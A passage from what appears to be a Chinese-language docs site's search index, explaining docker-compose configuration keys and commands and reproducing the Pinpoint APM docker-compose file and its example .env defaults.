network_mode # \u6307\u5b9a\u7f51\u7edc\u6a21\u5f0f (\u7b49\u540c\u4e8e docker run --net \u7684\u4f5c\u7528, \u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) networks # \u5c06\u5bb9\u5668\u52a0\u5165\u6307\u5b9a\u7f51\u7edc (\u7b49\u540c\u4e8e docker network connect \u7684\u4f5c\u7528), networks \u53ef\u4ee5\u4f4d\u4e8e compose \u6587\u4ef6\u9876\u7ea7\u952e\u548c services \u952e\u7684\u4e8c\u7ea7\u952e aliases # \u540c\u4e00\u7f51\u7edc\u4e0a\u7684\u5bb9\u5668\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u540d\u79f0\u6216\u522b\u540d\u8fde\u63a5\u5230\u5176\u4e2d\u4e00\u4e2a\u670d\u52a1\u7684\u5bb9\u5668 ipv4_address # IP V4 \u683c\u5f0f ipv6_address # IP V6 \u683c\u5f0f \u793a\u4f8b: version: '3.7' services: test: image: nginx:1.14-alpine container_name: mynginx command: ifconfig networks: app_net: # \u8c03\u7528\u4e0b\u9762 networks \u5b9a\u4e49\u7684 app_net \u7f51\u7edc ipv4_address: 172.16.238.10 networks: app_net: driver: bridge ipam: driver: default config: - subnet: 172.16.238.0/24 pid: 'host' # \u5171\u4eab\u5bbf\u4e3b\u673a\u7684 \u8fdb\u7a0b\u7a7a\u95f4(PID) ports # \u5efa\u7acb\u5bbf\u4e3b\u673a\u548c\u5bb9\u5668\u4e4b\u95f4\u7684\u7aef\u53e3\u6620\u5c04\u5173\u7cfb, ports \u652f\u6301\u4e24\u79cd\u8bed\u6cd5\u683c\u5f0f SHORT \u8bed\u6cd5\u683c\u5f0f\u793a\u4f8b: - \"3000\" # \u66b4\u9732\u5bb9\u5668\u7684 3000 \u7aef\u53e3, \u5bbf\u4e3b\u673a\u7684\u7aef\u53e3\u7531 docker \u968f\u673a\u6620\u5c04\u4e00\u4e2a\u6ca1\u6709\u88ab\u5360\u7528\u7684\u7aef\u53e3 - \"3000-3005\" # \u66b4\u9732\u5bb9\u5668\u7684 3000 \u5230 3005 \u7aef\u53e3, \u5bbf\u4e3b\u673a\u7684\u7aef\u53e3\u7531 docker \u968f\u673a\u6620\u5c04\u6ca1\u6709\u88ab\u5360\u7528\u7684\u7aef\u53e3 - \"8000:8000\" # \u5bb9\u5668\u7684 8000 \u7aef\u53e3\u548c\u5bbf\u4e3b\u673a\u7684 8000 \u7aef\u53e3\u5efa\u7acb\u6620\u5c04\u5173\u7cfb - \"9090-9091:8080-8081\" - \"127.0.0.1:8001:8001\" # \u6307\u5b9a\u6620\u5c04\u5bbf\u4e3b\u673a\u7684\u6307\u5b9a\u5730\u5740\u7684 - \"127.0.0.1:5000-5010:5000-5010\" - \"6060:6060/udp\" # \u6307\u5b9a\u534f\u8bae LONG \u8bed\u6cd5\u683c\u5f0f\u793a\u4f8b:(v3.2 \u65b0\u589e\u7684\u8bed\u6cd5\u683c\u5f0f) ports: - target: 80 # \u5bb9\u5668\u7aef\u53e3 published: 8080 # \u5bbf\u4e3b\u673a\u7aef\u53e3 protocol: tcp # \u534f\u8bae\u7c7b\u578b mode: host # host \u5728\u6bcf\u4e2a\u8282\u70b9\u4e0a\u53d1\u5e03\u4e3b\u673a\u7aef\u53e3, ingress \u5bf9\u4e8e\u7fa4\u6a21\u5f0f\u7aef\u53e3\u8fdb\u884c\u8d1f\u8f7d\u5747\u8861 secrets # \u4e0d\u77e5\u9053\u600e\u4e48\u7528 security_opt # \u4e3a\u6bcf\u4e2a\u5bb9\u5668\u8986\u76d6\u9ed8\u8ba4\u7684\u6807\u7b7e (\u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) stop_grace_period # \u6307\u5b9a\u5728\u53d1\u9001\u4e86 SIGTERM \u4fe1\u53f7\u4e4b\u540e, \u5bb9\u5668\u7b49\u5f85\u591a\u5c11\u79d2\u4e4b\u540e\u9000\u51fa(\u9ed8\u8ba4 10s) stop_signal # \u6307\u5b9a\u505c\u6b62\u5bb9\u5668\u53d1\u9001\u7684\u4fe1\u53f7 (\u9ed8\u8ba4\u4e3a SIGTERM \u76f8\u5f53\u4e8e kill PID; SIGKILL \u76f8\u5f53\u4e8e kill -9 PID; \u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) sysctls # \u8bbe\u7f6e\u5bb9\u5668\u4e2d\u7684\u5185\u6838\u53c2\u6570 (\u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) ulimits # \u8bbe\u7f6e\u5bb9\u5668\u7684 limit userns_mode # \u5982\u679cDocker\u5b88\u62a4\u7a0b\u5e8f\u914d\u7f6e\u4e86\u7528\u6237\u540d\u79f0\u7a7a\u95f4, \u5219\u7981\u7528\u6b64\u670d\u52a1\u7684\u7528\u6237\u540d\u79f0\u7a7a\u95f4 (\u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) volumes # \u5b9a\u4e49\u5bb9\u5668\u548c\u5bbf\u4e3b\u673a\u7684\u5377\u6620\u5c04\u5173\u7cfb, \u5176\u548c networks \u4e00\u6837\u53ef\u4ee5\u4f4d\u4e8e services \u952e\u7684\u4e8c\u7ea7\u952e\u548c compose \u9876\u7ea7\u952e, \u5982\u679c\u9700\u8981\u8de8\u670d\u52a1\u95f4\u4f7f\u7528\u5219\u5728\u9876\u7ea7\u952e\u5b9a\u4e49, \u5728 services \u4e2d\u5f15\u7528 SHORT \u8bed\u6cd5\u683c\u5f0f\u793a\u4f8b: volumes: - /var/lib/mysql # \u6620\u5c04\u5bb9\u5668\u5185\u7684 /var/lib/mysql \u5230\u5bbf\u4e3b\u673a\u7684\u4e00\u4e2a\u968f\u673a\u76ee\u5f55\u4e2d - /opt/data:/var/lib/mysql # \u6620\u5c04\u5bb9\u5668\u5185\u7684 /var/lib/mysql \u5230\u5bbf\u4e3b\u673a\u7684 /opt/data - ./cache:/tmp/cache # \u6620\u5c04\u5bb9\u5668\u5185\u7684 /var/lib/mysql \u5230\u5bbf\u4e3b\u673a compose \u6587\u4ef6\u6240\u5728\u7684\u4f4d\u7f6e - ~/configs:/etc/configs/:ro # \u6620\u5c04\u5bb9\u5668\u5bbf\u4e3b\u673a\u7684\u76ee\u5f55\u5230\u5bb9\u5668\u4e2d\u53bb, \u6743\u9650\u53ea\u8bfb - datavolume:/var/lib/mysql # datavolume \u4e3a volumes \u9876\u7ea7\u952e\u5b9a\u4e49\u7684\u76ee\u5f55, \u5728\u6b64\u5904\u76f4\u63a5\u8c03\u7528 LONG \u8bed\u6cd5\u683c\u5f0f\u793a\u4f8b:(v3.2 \u65b0\u589e\u7684\u8bed\u6cd5\u683c\u5f0f) version: \"3.2\" services: web: image: nginx:alpine ports: - \"80:80\" volumes: - type: volume # mount \u7684\u7c7b\u578b, \u5fc5\u987b\u662f bind\u3001volume \u6216 tmpfs source: mydata # \u5bbf\u4e3b\u673a\u76ee\u5f55 target: /data # \u5bb9\u5668\u76ee\u5f55 volume: # \u914d\u7f6e\u989d\u5916\u7684\u9009\u9879, \u5176 key \u5fc5\u987b\u548c type \u7684\u503c\u76f8\u540c nocopy: true # volume \u989d\u5916\u7684\u9009\u9879, \u5728\u521b\u5efa\u5377\u65f6\u7981\u7528\u4ece\u5bb9\u5668\u590d\u5236\u6570\u636e - type: bind # volume \u6a21\u5f0f\u53ea\u6307\u5b9a\u5bb9\u5668\u8def\u5f84\u5373\u53ef, \u5bbf\u4e3b\u673a\u8def\u5f84\u968f\u673a\u751f\u6210; bind \u9700\u8981\u6307\u5b9a\u5bb9\u5668\u548c\u6570\u636e\u673a\u7684\u6620\u5c04\u8def\u5f84 source: ./static target: /opt/app/static read_only: true # \u8bbe\u7f6e\u6587\u4ef6\u7cfb\u7edf\u4e3a\u53ea\u8bfb\u6587\u4ef6\u7cfb\u7edf volumes: mydata: # \u5b9a\u4e49\u5728 volume, \u53ef\u5728\u6240\u6709\u670d\u52a1\u4e2d\u8c03\u7528 restart # \u5b9a\u4e49\u5bb9\u5668\u91cd\u542f\u7b56\u7565(\u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879, \u5728 swarm \u4f7f\u7528 restart_policy \u4ee3\u66ff restart) no # \u7981\u6b62\u81ea\u52a8\u91cd\u542f\u5bb9\u5668(\u9ed8\u8ba4) always # \u65e0\u8bba\u5982\u4f55\u5bb9\u5668\u90fd\u4f1a\u91cd\u542f on-failure # \u5f53\u51fa\u73b0 on-failure \u62a5\u9519\u65f6, \u5bb9\u5668\u91cd\u65b0\u542f\u52a8 \u5176\u4ed6\u9009\u9879\uff1a domainname, hostname, ipc, mac_address, privileged, read_only, shm_size, stdin_open, tty, user, working_dir \u4e0a\u9762\u8fd9\u4e9b\u9009\u9879\u90fd\u53ea\u63a5\u53d7\u5355\u4e2a\u503c\u548c docker run \u7684\u5bf9\u5e94\u53c2\u6570\u7c7b\u4f3c \u5bf9\u4e8e\u503c\u4e3a\u65f6\u95f4\u7684\u53ef\u63a5\u53d7\u7684\u503c\uff1a 2.5s 10s 1m30s 2h32m 5h34m56s \u65f6\u95f4\u5355\u4f4d: us, ms, s, m\uff0c h \u5bf9\u4e8e\u503c\u4e3a\u5927\u5c0f\u7684\u53ef\u63a5\u53d7\u7684\u503c\uff1a 2b 1024kb 2048k 300m 1gb \u5355\u4f4d: b, k, m, g \u6216\u8005 kb, mb, gb networks # \u5b9a\u4e49 networks \u4fe1\u606f driver # \u6307\u5b9a\u7f51\u7edc\u6a21\u5f0f, \u5927\u591a\u6570\u60c5\u51b5\u4e0b, \u5b83 bridge \u4e8e\u5355\u4e2a\u4e3b\u673a\u548c overlay Swarm \u4e0a bridge # Docker \u9ed8\u8ba4\u4f7f\u7528 bridge \u8fde\u63a5\u5355\u4e2a\u4e3b\u673a\u4e0a\u7684\u7f51\u7edc overlay # overlay \u9a71\u52a8\u7a0b\u5e8f\u521b\u5efa\u4e00\u4e2a\u8de8\u591a\u4e2a\u8282\u70b9\u547d\u540d\u7684\u7f51\u7edc host # \u5171\u4eab\u4e3b\u673a\u7f51\u7edc\u540d\u79f0\u7a7a\u95f4(\u7b49\u540c\u4e8e docker run --net=host) none # \u7b49\u540c\u4e8e docker run --net=none driver_opts # v3.2\u4ee5\u4e0a\u7248\u672c, \u4f20\u9012\u7ed9\u9a71\u52a8\u7a0b\u5e8f\u7684\u53c2\u6570, \u8fd9\u4e9b\u53c2\u6570\u53d6\u51b3\u4e8e\u9a71\u52a8\u7a0b\u5e8f attachable # driver \u4e3a overlay \u65f6\u4f7f\u7528, \u5982\u679c\u8bbe\u7f6e\u4e3a true \u5219\u9664\u4e86\u670d\u52a1\u4e4b\u5916\uff0c\u72ec\u7acb\u5bb9\u5668\u4e5f\u53ef\u4ee5\u9644\u52a0\u5230\u8be5\u7f51\u7edc; \u5982\u679c\u72ec\u7acb\u5bb9\u5668\u8fde\u63a5\u5230\u8be5\u7f51\u7edc\uff0c\u5219\u5b83\u53ef\u4ee5\u4e0e\u5176\u4ed6 Docker \u5b88\u62a4\u8fdb\u7a0b\u8fde\u63a5\u5230\u7684\u8be5\u7f51\u7edc\u7684\u670d\u52a1\u548c\u72ec\u7acb\u5bb9\u5668\u8fdb\u884c\u901a\u4fe1 ipam # \u81ea\u5b9a\u4e49 IPAM \u914d\u7f6e. \u8fd9\u662f\u4e00\u4e2a\u5177\u6709\u591a\u4e2a\u5c5e\u6027\u7684\u5bf9\u8c61, \u6bcf\u4e2a\u5c5e\u6027\u90fd\u662f\u53ef\u9009\u7684 driver # IPAM \u9a71\u52a8\u7a0b\u5e8f, bridge \u6216\u8005 default config # \u914d\u7f6e\u9879 subnet # CIDR\u683c\u5f0f\u7684\u5b50\u7f51\uff0c\u8868\u793a\u8be5\u7f51\u7edc\u7684\u7f51\u6bb5 external # \u5916\u90e8\u7f51\u7edc, \u5982\u679c\u8bbe\u7f6e\u4e3a true \u5219 docker-compose up \u4e0d\u4f1a\u5c1d\u8bd5\u521b\u5efa\u5b83, \u5982\u679c\u5b83\u4e0d\u5b58\u5728\u5219\u5f15\u53d1\u9519\u8bef name # v3.5 \u4ee5\u4e0a\u7248\u672c, \u4e3a\u6b64\u7f51\u7edc\u8bbe\u7f6e\u540d\u79f0 \u6587\u4ef6\u683c\u5f0f\u793a\u4f8b\uff1a version: \"3\" services: redis: image: redis:alpine ports: - \"6379\" networks: - frontend deploy: replicas: 2 update_config: parallelism: 2 delay: 10s restart_policy: condition: on-failure db: image: postgres:9.4 volumes: - db-data:/var/lib/postgresql/data networks: - backend deploy: placement: constraints: [node.role == manager]\u590d\u5236\u4ee3\u7801","title":"docker_compse\u8bb2\u89e3"},{"location":"lxc/docker/pinpoint_compose/#pinpoint","text":"\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/pinpoint-apm/pinpoint-docker pinpoint docker-compose \u90e8\u7f72\u6587\u4ef6 https://github.com/pinpoint-apm/pinpoint-docker/blob/master/docker-compose.yml version: \"3.6\" services: pinpoint-hbase: build: context: ./pinpoint-hbase/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_HBASE_NAME}\" image: \"pinpointdocker/pinpoint-hbase:${PINPOINT_VERSION}\" networks: - pinpoint volumes: - /home/pinpoint/hbase - /home/pinpoint/zookeeper expose: # HBase Master API port - \"60000\" # HBase Master Web UI - \"16010\" # Regionserver API port - \"60020\" # HBase Regionserver web UI - \"16030\" ports: - \"60000:60000\" - \"16010:16010\" - \"60020:60020\" - \"16030:16030\" restart: always depends_on: - zoo1 pinpoint-mysql: build: context: ./pinpoint-mysql/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: pinpoint-mysql restart: always image: \"pinpointdocker/pinpoint-mysql:${PINPOINT_VERSION}\" hostname: pinpoint-mysql ports: - \"3306:3306\" environment: - MYSQL_ROOT_PASSWORD=${MYSQL_ROOT_PASSWORD} - MYSQL_USER=${MYSQL_USER} - MYSQL_PASSWORD=${MYSQL_PASSWORD} - MYSQL_DATABASE=${MYSQL_DATABASE} volumes: - mysql_data:/var/lib/mysql networks: - pinpoint pinpoint-web: build: context: ./pinpoint-web/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_WEB_NAME}\" image: \"pinpointdocker/pinpoint-web:${PINPOINT_VERSION}\" depends_on: - pinpoint-hbase - pinpoint-mysql - zoo1 restart: always expose: - \"9997\" ports: - \"9997:9997\" - \"${SERVER_PORT:-8080}:${SERVER_PORT:-8080}\" environment: - SERVER_PORT=${SERVER_PORT} - SPRING_PROFILES_ACTIVE=${SPRING_PROFILES},batch - PINPOINT_ZOOKEEPER_ADDRESS=${PINPOINT_ZOOKEEPER_ADDRESS} - CLUSTER_ENABLE=${CLUSTER_ENABLE} - ADMIN_PASSWORD=${ADMIN_PASSWORD} - CONFIG_SENDUSAGE=${CONFIG_SENDUSAGE} - LOGGING_LEVEL_ROOT=${WEB_LOGGING_LEVEL_ROOT} - CONFIG_SHOW_APPLICATIONSTAT=${CONFIG_SHOW_APPLICATIONSTAT} - BATCH_ENABLE=${BATCH_ENABLE} - BATCH_SERVER_IP=${BATCH_SERVER_IP} - BATCH_FLINK_SERVER=${BATCH_FLINK_SERVER} - JDBC_DRIVERCLASSNAME=${JDBC_DRIVERCLASSNAME} - JDBC_URL=${JDBC_URL} - JDBC_USERNAME=${JDBC_USERNAME} - JDBC_PASSWORD=${JDBC_PASSWORD} - ALARM_MAIL_SERVER_URL=${ALARM_MAIL_SERVER_URL} - ALARM_MAIL_SERVER_PORT=${ALARM_MAIL_SERVER_PORT} - ALARM_MAIL_SERVER_USERNAME=${ALARM_MAIL_SERVER_USERNAME} - ALARM_MAIL_SERVER_PASSWORD=${ALARM_MAIL_SERVER_PASSWORD} - ALARM_MAIL_SENDER_ADDRESS=${ALARM_MAIL_SENDER_ADDRESS} - ALARM_MAIL_TRANSPORT_PROTOCOL=${ALARM_MAIL_TRANSPORT_PROTOCOL} - ALARM_MAIL_SMTP_PORT=${ALARM_MAIL_SMTP_PORT} - ALARM_MAIL_SMTP_AUTH=${ALARM_MAIL_SMTP_AUTH} - ALARM_MAIL_SMTP_STARTTLS_ENABLE=${ALARM_MAIL_SMTP_STARTTLS_ENABLE} - ALARM_MAIL_SMTP_STARTTLS_REQUIRED=${ALARM_MAIL_SMTP_STARTTLS_REQUIRED} - ALARM_MAIL_DEBUG=${ALARM_MAIL_DEBUG} links: - \"pinpoint-mysql:pinpoint-mysql\" networks: - pinpoint pinpoint-collector: build: context: ./pinpoint-collector/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_COLLECTOR_NAME}\" image: \"pinpointdocker/pinpoint-collector:${PINPOINT_VERSION}\" depends_on: - pinpoint-hbase - zoo1 restart: always expose: - \"9991\" - \"9992\" - \"9993\" - \"9994\" - \"9995\" - \"9996\" ports: - \"${COLLECTOR_RECEIVER_GRPC_AGENT_PORT:-9991}:9991/tcp\" - \"${COLLECTOR_RECEIVER_GRPC_STAT_PORT:-9992}:9992/tcp\" - \"${COLLECTOR_RECEIVER_GRPC_SPAN_PORT:-9993}:9993/tcp\" - \"${COLLECTOR_RECEIVER_BASE_PORT:-9994}:9994\" - \"${COLLECTOR_RECEIVER_STAT_UDP_PORT:-9995}:9995/tcp\" - \"${COLLECTOR_RECEIVER_SPAN_UDP_PORT:-9996}:9996/tcp\" - \"${COLLECTOR_RECEIVER_STAT_UDP_PORT:-9995}:9995/udp\" - \"${COLLECTOR_RECEIVER_SPAN_UDP_PORT:-9996}:9996/udp\" networks: - pinpoint environment: - SPRING_PROFILES_ACTIVE=${SPRING_PROFILES} - PINPOINT_ZOOKEEPER_ADDRESS=${PINPOINT_ZOOKEEPER_ADDRESS} - CLUSTER_ENABLE=${CLUSTER_ENABLE} - LOGGING_LEVEL_ROOT=${COLLECTOR_LOGGING_LEVEL_ROOT} - FLINK_CLUSTER_ENABLE=${FLINK_CLUSTER_ENABLE} - FLINK_CLUSTER_ZOOKEEPER_ADDRESS=${FLINK_CLUSTER_ZOOKEEPER_ADDRESS} pinpoint-quickstart: build: context: ./pinpoint-quickstart/ dockerfile: Dockerfile container_name: \"pinpoint-quickstart\" image: \"pinpointdocker/pinpoint-quickstart\" ports: - \"${APP_PORT:-8080}:8080\" volumes: - data-volume:/pinpoint-agent environment: JAVA_OPTS: \"-javaagent:/pinpoint-agent/pinpoint-bootstrap-${PINPOINT_VERSION}.jar -Dpinpoint.agentId=${AGENT_ID} -Dpinpoint.applicationName=${APP_NAME} -Dpinpoint.profiler.profiles.active=${SPRING_PROFILES}\" networks: - pinpoint depends_on: - pinpoint-agent pinpoint-agent: build: context: ./pinpoint-agent/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_AGENT_NAME}\" image: \"pinpointdocker/pinpoint-agent:${PINPOINT_VERSION}\" restart: unless-stopped networks: - pinpoint volumes: - data-volume:/pinpoint-agent environment: - SPRING_PROFILES=${SPRING_PROFILES} - COLLECTOR_IP=${COLLECTOR_IP} - PROFILER_TRANSPORT_AGENT_COLLECTOR_PORT=${PROFILER_TRANSPORT_AGENT_COLLECTOR_PORT} - PROFILER_TRANSPORT_METADATA_COLLECTOR_PORT=${PROFILER_TRANSPORT_METADATA_COLLECTOR_PORT} - PROFILER_TRANSPORT_STAT_COLLECTOR_PORT=${PROFILER_TRANSPORT_STAT_COLLECTOR_PORT} - PROFILER_TRANSPORT_SPAN_COLLECTOR_PORT=${PROFILER_TRANSPORT_SPAN_COLLECTOR_PORT} - PROFILER_SAMPLING_RATE=${PROFILER_SAMPLING_RATE} - DEBUG_LEVEL=${AGENT_DEBUG_LEVEL} - PROFILER_TRANSPORT_MODULE=${PROFILER_TRANSPORT_MODULE} depends_on: - pinpoint-collector #zookeepers zoo1: image: zookeeper:3.4 restart: always hostname: zoo1 expose: - \"2181\" - \"2888\" - \"3888\" ports: - \"2181\" environment: ZOO_MY_ID: 1 ZOO_SERVERS: server.1=0.0.0.0:2888:3888 server.2=zoo2:2888:3888 server.3=zoo3:2888:3888 networks: - pinpoint zoo2: image: zookeeper:3.4 restart: always hostname: zoo2 expose: - \"2181\" - \"2888\" - \"3888\" ports: - \"2181\" environment: ZOO_MY_ID: 2 ZOO_SERVERS: server.1=zoo1:2888:3888 server.2=0.0.0.0:2888:3888 server.3=zoo3:2888:3888 networks: - pinpoint zoo3: image: zookeeper:3.4 restart: always hostname: zoo3 expose: - \"2181\" - \"2888\" - \"3888\" ports: - \"2181\" environment: ZOO_MY_ID: 3 ZOO_SERVERS: server.1=zoo1:2888:3888 server.2=zoo2:2888:3888 server.3=0.0.0.0:2888:3888 networks: - pinpoint ##flink jobmanager: build: context: pinpoint-flink dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_FLINK_NAME}-jobmanager\" image: \"pinpointdocker/pinpoint-flink:${PINPOINT_VERSION}\" expose: - \"6123\" ports: - \"${FLINK_WEB_PORT:-8081}:8081\" command: standalone-job -p 1 pinpoint-flink-job.jar -spring.profiles.active release environment: - JOB_MANAGER_RPC_ADDRESS=jobmanager - PINPOINT_ZOOKEEPER_ADDRESS=${PINPOINT_ZOOKEEPER_ADDRESS} networks: - pinpoint depends_on: - zoo1 taskmanager: build: context: pinpoint-flink dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_FLINK_NAME}-taskmanager\" image: \"pinpointdocker/pinpoint-flink:${PINPOINT_VERSION}\" expose: - \"6121\" - \"6122\" - \"19994\" ports: - \"6121:6121\" - \"6122:6122\" - \"19994:19994\" depends_on: - zoo1 - jobmanager command: taskmanager links: - \"jobmanager:jobmanager\" environment: - JOB_MANAGER_RPC_ADDRESS=jobmanager networks: - pinpoint volumes: data-volume: mysql_data: networks: pinpoint: driver: bridge docker-compose\u4f1a\u9ed8\u8ba4\u8bfb\u53d6\u540c\u7ea7\u76ee\u5f55\u7684.env PINPOINT_VERSION=2.3.2 SPRING_PROFILES=release #zookeeper information required PINPOINT_ZOOKEEPER_ADDRESS=zoo1 ### Pinpoint-Hbase PINPOINT_HBASE_NAME=pinpoint-hbase #config for hbase in external docker ### Pinpoint-mysql MYSQL_ROOT_PASSWORD=root123 MYSQL_USER=admin MYSQL_PASSWORD=admin MYSQL_DATABASE=pinpoint ### Pinpoint-Web PINPOINT_WEB_NAME=pinpoint-web SERVER_PORT=8079 WEB_LOGGING_LEVEL_ROOT=INFO CLUSTER_ENABLE=true ADMIN_PASSWORD=admin #analytics CONFIG_SENDUSAGE=true #flink server information required if used BATCH_ENABLE=false BATCH_SERVER_IP=127.0.0.1 BATCH_FLINK_SERVER=pinpoint-flink-jobmanager CONFIG_SHOW_APPLICATIONSTAT=true #mysql information required if used JDBC_DRIVERCLASSNAME=com.mysql.jdbc.Driver JDBC_URL=jdbc:mysql://pinpoint-mysql:3306/pinpoint?characterEncoding=UTF-8 JDBC_USERNAME=admin JDBC_PASSWORD=admin #mail server information required if used ALARM_MAIL_SERVER_URL=smtp.gmail.com ALARM_MAIL_SERVER_PORT=587 ALARM_MAIL_SERVER_USERNAME=username ALARM_MAIL_SERVER_PASSWORD=password ALARM_MAIL_SENDER_ADDRESS=pinpoint_operator@pinpoint.com ALARM_MAIL_TRANSPORT_PROTOCOL=smtp ALARM_MAIL_SMTP_PORT=25 ALARM_MAIL_SMTP_AUTH=false ALARM_MAIL_SMTP_STARTTLS_ENABLE=false ALARM_MAIL_SMTP_STARTTLS_REQUIRED=false ALARM_MAIL_DEBUG=false ### Pinpoint-Collector PINPOINT_COLLECTOR_NAME=pinpoint-collector CLUSTER_ENABLE=true COLLECTOR_LOGGING_LEVEL_ROOT=INFO #grpc COLLECTOR_RECEIVER_GRPC_AGENT_PORT=9991 COLLECTOR_RECEIVER_GRPC_STAT_PORT=9992 COLLECTOR_RECEIVER_GRPC_SPAN_PORT=9993 #thrift COLLECTOR_RECEIVER_BASE_PORT=9994 COLLECTOR_RECEIVER_STAT_UDP_PORT=9995 COLLECTOR_RECEIVER_SPAN_UDP_PORT=9996 FLINK_CLUSTER_ENABLE=true FLINK_CLUSTER_ZOOKEEPER_ADDRESS=zoo1 ### Pinpoint-Agent PINPOINT_AGENT_NAME=pinpoint-agent #network module(GRPC,THRIFT) PROFILER_TRANSPORT_MODULE=GRPC #collector information required COLLECTOR_IP=pinpoint-collector PROFILER_TRANSPORT_AGENT_COLLECTOR_PORT=9991 PROFILER_TRANSPORT_METADATA_COLLECTOR_PORT=9991 PROFILER_TRANSPORT_STAT_COLLECTOR_PORT=9992 PROFILER_TRANSPORT_SPAN_COLLECTOR_PORT=9993 COLLECTOR_TCP_PORT=9994 COLLECTOR_STAT_PORT=9995 COLLECTOR_SPAN_PORT=9996 # Set sampling rate. If you set it to N, 1 out of N transaction will be sampled. PROFILER_SAMPLING_RATE=1 AGENT_ID=app-in-docker APP_NAME=quickapp AGENT_DEBUG_LEVEL=INFO ### Pinpoint-flink PINPOINT_FLINK_NAME=pinpoint-flink FLINK_WEB_PORT=8081 ### Pinpoint-quickstart APP_PORT=8000","title":"pinpoint"},{"location":"lxc/docker/pinpoint_compose/#_1","text":"Docker Compose \u5c06\u6240\u7ba1\u7406\u7684\u5bb9\u5668\u5206\u4e3a\u4e09\u5c42\uff0c\u5206\u522b\u662f\u5de5\u7a0b\uff08project\uff09\u3001\u670d\u52a1\uff08service\uff09\u3001\u5bb9\u5668\uff08container\uff09 Docker Compose \u8fd0\u884c\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\uff08docker-compose.yml\uff09\u7ec4\u6210\u4e00\u4e2a\u5de5\u7a0b,\u4e00\u4e2a\u5de5\u7a0b\u5305\u542b\u591a\u4e2a\u670d\u52a1\uff0c\u6bcf\u4e2a\u670d\u52a1\u4e2d\u5b9a\u4e49\u4e86\u5bb9\u5668\u8fd0\u884c\u7684\u955c\u50cf\u3001\u53c2\u6570\u3001\u4f9d\u8d56\uff0c\u4e00\u4e2a\u670d\u52a1\u53ef\u5305\u62ec\u591a\u4e2a\u5bb9\u5668\u5b9e\u4f8b","title":"\u5de5\u7a0b\u3001\u670d\u52a1\u3001\u5bb9\u5668"},{"location":"lxc/docker/pinpoint_compose/#docker-compose","text":"","title":"Docker Compose \u5e38\u7528\u547d\u4ee4\u4e0e\u914d\u7f6e"},{"location":"lxc/docker/pinpoint_compose/#_2","text":"ps \uff1a\u5217\u51fa\u6240\u6709\u8fd0\u884c\u5bb9\u5668 docker-compose ps logs \uff1a\u67e5\u770b\u670d\u52a1\u65e5\u5fd7\u8f93\u51fa docker-compose logs port \uff1a\u6253\u5370\u7ed1\u5b9a\u7684\u516c\u5171\u7aef\u53e3\uff0c\u4e0b\u9762\u547d\u4ee4\u53ef\u4ee5\u8f93\u51fa eureka \u670d\u52a1 8761 \u7aef\u53e3\u6240\u7ed1\u5b9a\u7684\u516c\u5171\u7aef\u53e3 docker-compose port eureka 8761 build \uff1a\u6784\u5efa\u6216\u8005\u91cd\u65b0\u6784\u5efa\u670d\u52a1 docker-compose build start \uff1a\u542f\u52a8\u6307\u5b9a\u670d\u52a1\u5df2\u5b58\u5728\u7684\u5bb9\u5668 docker-compose start eureka stop \uff1a\u505c\u6b62\u5df2\u8fd0\u884c\u7684\u670d\u52a1\u7684\u5bb9\u5668 docker-compose stop eureka rm \uff1a\u5220\u9664\u6307\u5b9a\u670d\u52a1\u7684\u5bb9\u5668 docker-compose rm eureka up \uff1a\u6784\u5efa\u3001\u542f\u52a8\u5bb9\u5668 docker-compose up kill \uff1a\u901a\u8fc7\u53d1\u9001 SIGKILL \u4fe1\u53f7\u6765\u505c\u6b62\u6307\u5b9a\u670d\u52a1\u7684\u5bb9\u5668 docker-compose kill eureka pull \uff1a\u4e0b\u8f7d\u670d\u52a1\u955c\u50cf scale \uff1a\u8bbe\u7f6e\u6307\u5b9a\u670d\u52a1\u8fd0\u6c14\u5bb9\u5668\u7684\u4e2a\u6570\uff0c\u4ee5 service=num \u5f62\u5f0f\u6307\u5b9a docker-compose scale user=3 movie=3 run \uff1a\u5728\u4e00\u4e2a\u670d\u52a1\u4e0a\u6267\u884c\u4e00\u4e2a\u547d\u4ee4 docker-compose run web bash","title":"\u5e38\u89c1\u547d\u4ee4"},{"location":"lxc/docker/pinpoint_compose/#docker-composeyml","text":"version \uff1a\u6307\u5b9a docker-compose.yml \u6587\u4ef6\u7684\u5199\u6cd5\u683c\u5f0f services \uff1a\u591a\u4e2a\u5bb9\u5668\u96c6\u5408 build \uff1a\u914d\u7f6e\u6784\u5efa\u65f6\uff0cCompose \u4f1a\u5229\u7528\u5b83\u81ea\u52a8\u6784\u5efa\u955c\u50cf\uff0c\u8be5\u503c\u53ef\u4ee5\u662f\u4e00\u4e2a\u8def\u5f84\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u7528\u4e8e\u6307\u5b9a Dockerfile \u53c2\u6570 build: ./dir --------------- build: context: ./dir dockerfile: Dockerfile args: buildno: 1 command \uff1a\u8986\u76d6\u5bb9\u5668\u542f\u52a8\u540e\u9ed8\u8ba4\u6267\u884c\u7684\u547d\u4ee4 command: bundle exec thin -p 3000 ---------------------------------- command: [bundle,exec,thin,-p,3000] 